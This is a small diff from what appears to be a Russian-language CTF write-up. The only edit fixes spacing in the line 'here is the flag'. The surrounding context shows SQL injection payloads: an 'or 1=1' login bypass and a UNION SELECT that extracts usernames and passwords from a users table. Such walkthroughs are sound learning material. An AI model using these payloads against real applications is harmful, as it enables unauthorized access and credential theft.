@@ -17,4 +17,4 @@ admin' or 1=1--
 ' UNION SELECT username, password FROM users--
 ```
 <img width="1512" alt="Снимок экрана 2024-09-16 в 15 40 15" src="https://github.com/user-attachments/assets/69bc9dc4-2417-49a7-b564-3d8c63bbd3fb">
--А вот и флаг
+- А вот и флаг
